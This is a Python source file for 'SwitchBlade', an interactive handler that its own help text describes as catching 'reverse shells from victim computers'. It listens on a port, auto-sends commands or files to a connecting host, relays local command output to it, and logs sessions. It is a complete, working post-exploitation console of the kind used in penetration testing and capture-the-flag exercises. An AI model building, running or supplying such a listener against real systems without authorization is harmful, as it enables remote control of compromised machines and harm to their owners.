#!/bin/env python3
# SwitchBlade - a python based TCP/IP handler for remote connections
# It's not as versatile as the Swiss-Army knife, but it's real good for stabbin'
# Original Author: Connor Gannon (Gin&Miskatonic)
# Init Date: 14 Nov 2018
# Modified by: jdbivens42 (https://github.com/jdbivens42)
#
import sys
import os
import socket
import threading

import prompt_toolkit
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout
import argparse

import nclib
from nclib.errors import NetcatError, NetcatTimeout

import re

import shlex
import subprocess

import time

ansi_escape = re.compile('\x1b[^m\x07]*[m\x07]')


class Switchblade:
    
    def __init__(self, args):
        self.args = args
        self._init_args()
        self.args.transcript = os.path.realpath(os.path.expanduser(self.args.transcript))
        self.stats_dict = {
            "cmds_sent":0, 
            "data_sent":0,
            "data_recv":0,
            "connections":[],
            "last_seen":None
        }
        if not self.args.no_banner:
            self.print_banner()
        self._init_nc()
        if self.args.verbosity > 0:
            self.print_local("Transcript located at: {}".format(self.args.transcript))
        self.assume_prompt = True
        self.prompt_str = ""
        self.prompt_suffix = "" # last 2 characters of the prompt, usually "# "
        self.esc = ":"
        self._setup_builtins()
        if self.args.welcome_msg:
            self.send(self.args.welcome_msg)
        if self.args.welcome_file:
            with open(self.args.welcome_file, 'rb') as f:
                self.send(f.read(), suffix=b'')
        if self.args.welcome_cmd:
            raddr = self.get_raddr()
            self.args.welcome_cmd = self.args.welcome_cmd.replace('{RHOST}', raddr[0]).replace('{RPORT}', str(raddr[1]))
            self.run(shlex.split(self.args.welcome_cmd))


    @staticmethod
    def get_parser():
        parser = argparse.ArgumentParser(description='A smart handler to catch reverse shells from victim computers.')
        parser.add_argument('-p', '--port', default=443, type=int, required=False, help="The port on which switchblade will listen. The default is 443")
        parser.add_argument('-w', '--welcome_msg', help="A message (*cough* command *cough*) That should be sent to the remote machine upon connection. Can be combined with -f and -s")
        parser.add_argument('-f', '--welcome_file', help="A file containing commands that should be sent to the remote machine. Can be combined with -w and -s.")
        parser.add_argument('-c', '--welcome_cmd', help="A shell command that should be executed locally upon connection. The output is sent to the remote machine. Can be combined with -w and -f." + 
                                                        "  Strings {RHOST} and {RPORT} in welcome_cmd will be replaced with the remote IP address and the remote port used by the client.")
        parser.add_argument('-u', '--udp', action="store_true", help="Use UDP instead of TCP [EXPERIMENTAL].")
        parser.add_argument('-l', '--listen', action="store_true", help="Listen for connections.")
        parser.add_argument('--log_send', type=str, required=False, help="A filepath to log raw data sent.")
        parser.add_argument('--log_recv', type=str, required=False, help="A filepath to log raw data received.")
        parser.add_argument('-t', '--transcript', type=str, required=False, default=".transcript", help="A filepath to log all commands entered and final data printed to user.")
        parser.add_argument("-v", "--verbosity", default=0, action="count", help="Level of verbosity. Use -vv or -vvv for additional verbosity")
        parser.add_argument('--no_banner', action="store_true", required=False, help="Do not print the banner.")

        parser.add_argument('IP', nargs="?", help="The address switchblade should bind (or connect) to. Default is 0.0.0.0")
        parser.add_argument('PORT', type=int, nargs="?", help="The port to connect to, if not in listen mode.")
        return parser

    @staticmethod
    def format_size(x):
        sizes = [ "B", "KB", "MB", "GB", "TB" ]
        i = 0
        y = x
        while (i < len(sizes) and  x >= 1024):
                y = x / 1024.0
                i = i + 1
                x = x / 1024
        return str(round(y, 2)) + sizes[i]

    @staticmethod
    def to_bytes(s):
        if type(s) is str:
            return s.encode()
        else:
            return s

    def print_banner(self):
        self.print_local("""

**********************************************************************************
*     _____  _    _ _____ _____ _____  _   _ ______ _       ___ ______ _____     *
*    /  ___|| |  | |_   _|_   _/  __ \| | | || ___ \ |     / _ \|  _  \  ___|    *
*    \ `--. | |  | | | |   | | | /  \/| |_| || |_/ / |    / /_\ \ | | | |__      *
*     `--. \| |/\| | | |   | | | |    |  _  || ___ \ |    |  _  | | | |  __|     *
*    /\__/ /\  /\  /_| |_  | | | \__/\| | | || |_/ / |____| | | | |/ /| |___     *
*    \____/  \/  \/ \___/  \_/  \____/\_| |_/\____/\_____/\_| |_/___/ \____/     *
*                                                                                *
**********************************************************************************

""")

    def _setup_builtins(self):
        self.builtins = [
            {'cmd':'help',
             'desc':'Display this help menu.',
             'usage':'{}help'.format(self.esc)
            }, 
            {'cmd':'clear',
             'desc':'Clear the screen locally.',
             'usage':'{}clear'.format(self.esc)
            }, 
            {'cmd':'source',
             'desc':'send the contents of a file on the local machine and send it to the remote client.',
             'usage':'{}send ~/cmds.list'.format(self.esc)
            }, 
            {'cmd':'sessions',
             'desc':'Show all active sessions.',
             'usage':'{}sessions'.format(self.esc)
            }, 
            {'cmd':'interact',
             'desc':'Interact / attach to a particular session by ID.',
             'usage':'{}interact <Session ID>'.format(self.esc)
            }, 
            {'cmd':'stats',
             'desc':'Print statistics about this session.',
             'usage':'{}stats'.format(self.esc)
            }, 
            {'cmd':'run',
             'desc':'Run the command locally, sending the raw results (STDOUT) to the remote client.\n' + 
                    'A newline will not be added if none is present, so you may need to press enter\n' + 
                    'manually to run the command.',
             'usage':'{}run /path/to/exe -args'.format(self.esc)
            }, 
            {'cmd':'bash',
             'desc':'Run the command locally, without sending anything to the remote client',
             'usage':'{}bash /path/to/exe -args'.format(self.esc)
            }, 
            {'cmd':'save',
             'desc':'Redirect the output of the next command* to file locally.\n' +
                    'Saved output is not printed to the screen, unless tee mode is on.',
             'usage':'{}save /path/to/file'.format(self.esc)
            }, 
            {'cmd':'start_save',
             'desc':'Begin capturing command output to a file. Disable with stop_save.',
             'usage':'{}start_save /path/to/file'.format(self.esc)
            }, 
            {'cmd':'stop_save',
             'desc':'Begin capturing command output to a file. Disable with stop_save.',
             'usage':'{}stop_save /path/to/file'.format(self.esc)
            }, 
            {'cmd':'tee',
             'desc':'Toggle tee mode. Default is False.' + 
                    'If tee mode is on, save output (see save and start_save)' +
                    ' is also printed to the screen.',
             'usage':'tee'.format(self.esc)
            }, 
            {'cmd':'exit',
             'desc':'Exit switchblade. Use exit -y to kill all background sessions.',
             'usage':'{0}exit\n{0}exit -y'.format(self.esc)
            }, 
        ]

    def print_local(self, *args, **kwargs):
        msg = " ".join(map(str,args))
        if self.args.transcript:
            self.log_transcript(msg, **kwargs)
        print(msg, **kwargs)

    def log_transcript(self, msg, **kwargs):
        with open(self.args.transcript, "a") as t:
            print("{0}{1}{0}".format("-"*15, time.asctime()), file=t)
            print(msg, file=t, **kwargs)

    def _init_args(self):
        self.args.save = False 
        self.args.save_started = False 
        self.args.save_wait = False 
        self.args.tee = False
        self.args.save_file = None

    def _init_nc(self):
        if self.args.listen:
            if not self.args.IP:
                self.args.IP = "0.0.0.0"
            if self.args.verbosity > 0:
                self.print_local ("Listening on {}:{} ({})".format(self.args.IP, self.args.port, "UDP" if self.args.udp else "TCP"))
            self.nc = nclib.Netcat(listen=(self.args.IP, self.args.port), udp=self.args.udp, log_send=self.args.log_send, log_recv=self.args.log_recv)
        else:
            if self.args.verbosity > 0:
                self.print_local ("Connecting to {}:{} ({})".format(self.args.IP, self.args.PORT, "UDP" if self.args.udp else "TCP"))
            self.nc = nclib.Netcat(connect=(self.args.IP, self.args.PORT), udp=self.args.udp, log_send=self.args.log_send, log_recv=self.args.log_recv)
            
        if self.args.verbosity > 0:
            self.print_local("Connection from: {}:{}".format(self.get_raddr()[0], self.get_raddr()[1]))
        self.stats_dict["connections"].append(time.time())

    def get_raddr(self):
        return self.nc.sock.getpeername()
 
    def set_prompt(self, prompt):
        self.prompt_str = ansi_escape.sub('', prompt)

    def _help(self, d):
        self.print_local('-'*80)
        self.print_local("Command - {}".format(d['cmd']))
        self.print_local('*'*60)
        self.print_local(d['desc'])
        self.print_local('*'*60)
        self.print_local("Example Usage - \n\n{}".format(d['usage']))
        self.print_local("")
    def help(self, cmd):
        if cmd:
            if type(cmd) is list:
                cmd = cmd[0]
            try:
                self._help(next(d for d in self.builtins if d["cmd"] == cmd))
                return
            except StopIteration as e:
                pass

        for d in self.builtins:
            self._help(d)

    def sessions(self, cmd):
        self.print_local("Not implemented")

    def source(self, cmd):
        for filename in cmd:
            with open(filename, 'rb') as f:
                if self.args.verbosity > 0:
                    self.print_local("Sending {}".format(filename))
                self._send(f.read())

    def interact(self, cmd):
        self.print_local("Not implemented")

    def stats(self, cmd):
        print("Client................ {}:{}".format(self.get_raddr()[0], self.get_raddr()[1]))
        if not self.stats_dict["last_seen"]:
            print("Last Seen............. {}".format("never"))
        else:
            ago = time.strftime("%H:%M:%S", time.gmtime(time.time() - self.stats_dict["last_seen"]))
            last_seen = time.asctime(time.localtime(self.stats_dict["last_seen"]))
            print("Last Seen............. {} ({} ago)".format(last_seen, ago))

        if not self.stats_dict["connections"]:
            print("Connection Duration... {}".format("N/A"))
        else:
            print("Connection Duration... {}".format( time.strftime("%H:%M:%S", time.gmtime(time.time() - self.stats_dict["connections"][-1]) ) ))
        print("Commands Sent......... {}".format(self.stats_dict["cmds_sent"]))
        print("Data Sent............. {}".format(self.format_size(self.stats_dict["data_sent"])))
        print("Data Received......... {}".format(self.format_size(self.stats_dict["data_recv"])))

    def clear(self, cmd):
        prompt_toolkit.shortcuts.clear()        

    def save(self, cmd):
        self.args.save = True
        self.args.save_wait = False
        self.args.save_started = False
        self.args.save_file = os.path.realpath(os.path.expanduser(cmd[0]))
        with open(self.args.save_file, "w"):
            pass
         
    def start_save(self, cmd):
        self.args.save = True
        self.args.save_wait = False
        self.args.save_started = True
        self.args.save_file = os.path.realpath(os.path.expanduser(cmd[0]))
        with open(self.args.save_file, "w"):
            pass

    def stop_save(self, cmd):
        self.args.save = False
        self.args.save_wait = False
        self.args.save_started = False

    def tee(self, cmd):
        self.args.tee = not self.args.tee
        print("tee: {}".format(self.args.tee))
    
    def bash(self, cmd):
        cmd = subprocess.list2cmdline(cmd) 
        p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
        print(p.stdout.decode())
        
    def run(self, cmd):
        cmd = subprocess.list2cmdline(cmd) #' '.join([shlex.quote(c) for c in cmd])
        if self.args.verbosity > 0:
            self.print_local("Running: {}".format(cmd))
        p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        if p.stderr:
            self.print_local("-----ERROR IN RUN-----")
            self.print_local(p.stderr.decode())
            self.print_local('-'*20)
        if p.stdout:
            if self.args.verbosity > 0:
                self.print_local("-----SENDING-----")
                self.print_local(p.stdout.decode())
                self.print_local('-'*20)
            self.send(p.stdout, suffix=b'')

    def exit(self, cmd):
        #TODO: Give a warning if there are background sessions
        os._exit(0)

    def handle_builtin(self, cmd):
        # If it is a real command, call the right method
        supported = [b['cmd'] for b in self.builtins]
        try:
            split_cmd = shlex.split(cmd)
        except Exception as e:
            print(e)
            self.help(cmd)
            return

        #self.print_local("{} in {}?  {}".format(cmd, supported, cmd in supported)
        if split_cmd[0] in supported:
            try:
                getattr(self, split_cmd[0])(split_cmd[1:])
            except Exception as e:
                print(e)
                self.help(split_cmd[0])
        else:
            self.print_local("Invalid command {}".format(cmd))
            print("Use {}help to show available commands".format(self.esc))
            #self.help(cmd)
    
    def send(self, cmd, suffix="\n"):
        if self.args.transcript:
            self.log_transcript(cmd)
        self.stats_dict["cmds_sent"] += 1
        cmd = self.to_bytes(cmd+suffix)
        self._send(cmd)

    def _send(self,cmd):
        self.stats_dict["data_sent"] += len(cmd)
        self.nc.send(cmd)

    def _recv(self):
        return self.nc.recv()

    def recv(self):
        msg = self._recv()
        if self.args.verbosity > 1:
            print("{0}{1}{0}".format("-"*15, time.asctime()))
        self.stats_dict["last_seen"] = time.time()
        self.stats_dict["data_recv"] += len(msg)
        
        # Keep the data binary, just print a text representation to the screen
        return msg

    def recv_forever(self):
        while True:
            try:
                msg = self.recv()
                if self.args.verbosity > 2: 
                    self.print_local("msg: {}".format(msg))
                msg_str = msg.decode(errors="ignore")
                if len(msg) != len(msg.decode(errors="ignore")):
                    self.print_local("Decoding error: {} chars removed".format(len(msg) - len(msg.decode(errors="ignore"))))

                if self.args.verbosity > 2: 
                    self.print_local("Received {} chars".format(len(msg)))

                if self.assume_prompt:
                    split = msg_str.rsplit("\n", 1)
                    if not self.prompt_suffix or split[-1].endswith(self.prompt_suffix):
                        self.prompt_suffix = split[-1][-2:]
                        self.set_prompt(split[-1])
                        # If there isn't actually a prompt, this is very, very dangerous
                        if len(split) > 1:
                            msg_str = split[0]+'\n'
                        else:
                            # we set it to the prompt_str already. Not safe, but okay
                            msg_str = ""
                if self.args.verbosity > 2: 
                    self.print_local("msg_str: {}".format(msg_str))
                if not self.args.save or self.args.tee:
                    self.print_local(msg_str, end="")
                if self.args.save:
                    with open(self.args.save_file, "a") as f:
                        f.write(msg_str)
            except NetcatError as e:
                if "dropped" in e.args[0]:
                    self.print_local("!!CLIENT DISCONNECTED!!")
                    print("Waiting for new connection...")
                    self._init_nc()
            except Exception as e:
                self.print_local("!!RECEIVE FAILED!!")
                try:
                    import traceback
                    traceback.print_last()
                except Exception:
                    pass

    def listener(self):
        self.session = PromptSession()
        recv_thread = threading.Thread(target=self.recv_forever)
        recv_thread.daemon = True
        try:
            recv_thread.start()
            while True:
                with patch_stdout():
                    if self.assume_prompt:
                        # Slight delay in case the prompt changed
                        time.sleep(0.25)
                        if not self.prompt_str:
                            if self.args.verbosity > 1: 
                                self.print_local("Waiting to receive prompt for RHOST...")
                            time.sleep(1)
                            if not self.prompt_str:
                                if self.args.verbosity > 1: 
                                    self.print_local("Using default prompt (#)")
                                self.set_prompt('#')
                                self.assume_prompt = False
                    cmd = self.session.prompt(str(self.prompt_str))
                    # A command has been entered

                    if cmd.startswith(self.esc):
                        self.handle_builtin(cmd[len(self.esc):])
                        continue
                    if self.args.save_wait and not self.args.save_started:
                        self.args.save = False
                        self.args.save_wait = False
                    elif self.args.save:
                        self.args.save_wait = True
                    try:
                        self.send(cmd)
                    except (socket.error, NetcatError):
                        self.print_local("!!SEND FAILED!!")

        except Exception as e:
            self.print_local("Exception: {}".format(e))
            import traceback
            traceback.print_last()
        finally:
            self.nc.close()

if __name__=="__main__":
    parser = Switchblade.get_parser()
    sb = Switchblade(parser.parse_args()) 
    sb.listener()
